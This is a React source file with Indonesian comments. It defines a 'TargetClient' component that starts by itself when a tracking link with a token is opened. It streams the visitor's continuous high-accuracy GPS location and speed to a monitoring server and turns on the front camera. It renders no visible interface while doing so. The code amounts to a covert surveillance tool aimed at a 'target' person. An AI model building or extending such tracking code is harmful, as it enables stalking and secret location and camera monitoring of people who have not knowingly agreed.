import React, { useState, useEffect, useRef } from 'react';
import { io } from 'socket.io-client';
import { MapPin, Video, Send, CheckCircle, AlertCircle, ShieldCheck } from 'lucide-react';

export default function TargetClient({ token }) {
  const [status, setStatus] = useState('ready'); // 'ready' | 'connecting' | 'tracking' | 'error'
  const [errorMsg, setErrorMsg] = useState('');
  
  const [locationActive, setLocationActive] = useState(false);
  const [cameraActive, setCameraActive] = useState(false);
  
  const [coords, setCoords] = useState({ latitude: null, longitude: null });
  const [speed, setSpeed] = useState(0);

  const socketRef = useRef(null);
  const videoRef = useRef(null);
  const geoWatchIdRef = useRef(null);

  const SOCKET_SERVER = 'http://localhost:5000';

  // Bersihkan pemantauan lokasi jika halaman ditutup
  useEffect(() => {
    // Auto-start sharing when token is present
    if (token && status === 'ready') {
      handleStartSharing();
    }
    return () => {
      if (geoWatchIdRef.current) {
        navigator.geolocation.clearWatch(geoWatchIdRef.current);
      }
      if (socketRef.current) {
        socketRef.current.disconnect();
      }
    };
  }, []);

  const handleStartSharing = async () => {
    setStatus('connecting');
    setErrorMsg('');

    try {
      // 1. Hubungkan WebSocket ke Server
      const socket = io(SOCKET_SERVER, {
        transports: ['websocket'],
      });
      socketRef.current = socket;

      socket.on('connect', () => {
        // Autentikasi dengan token yang ada di link
        socket.emit('device:auth', { token });
      });

      socket.on('device:auth_success', () => {
        setStatus('tracking');
        // Aktifkan tracking GPS & Kamera setelah sukses terhubung
        startTrackingGPS(socket);
        startCameraStream();
      });

      socket.on('device:auth_error', (data) => {
        setStatus('error');
        setErrorMsg(data.message || 'Token tidak valid. Silakan periksa kembali tautan Anda.');
        socket.disconnect();
      });

      socket.on('disconnect', () => {
        setStatus('connecting');
      });

    } catch (err) {
      setStatus('error');
      setErrorMsg('Gagal terhubung ke server monitoring.');
    }
  };

  // Fungsi mengaktifkan tracking lokasi
  const startTrackingGPS = (socket) => {
    if (!('geolocation' in navigator)) {
      setErrorMsg('Browser Anda tidak mendukung GPS Geolocation.');
      return;
    }

    setLocationActive(true);
    geoWatchIdRef.current = navigator.geolocation.watchPosition(
      (position) => {
        const { latitude, longitude, speed } = position.coords;
        const currentSpeed = speed ? speed * 3.6 : 0; // m/s ke km/h

        setCoords({ latitude, longitude });
        setSpeed(currentSpeed);

        // Kirim data ke WebSocket server
        socket.emit('device:ping', {
          latitude,
          longitude,
          speed: currentSpeed,
        });
      },
      (err) => {
        console.error('Error GPS:', err);
        setErrorMsg('Izin akses lokasi ditolak atau GPS tidak aktif.');
      },
      {
        enableHighAccuracy: true,
        maximumAge: 0,
        timeout: 10000,
      }
    );
  };

  // Fungsi mengaktifkan kamera depan/belakang target
  const startCameraStream = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' }, // menggunakan kamera depan default
        audio: false,
      });
      
      setCameraActive(true);
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play();
      }
    } catch (err) {
      console.warn('Camera access denied or unavailable:', err);
      // Tetap lanjutkan tracking lokasi meskipun kamera ditolak
    }
  };

  return null;
}
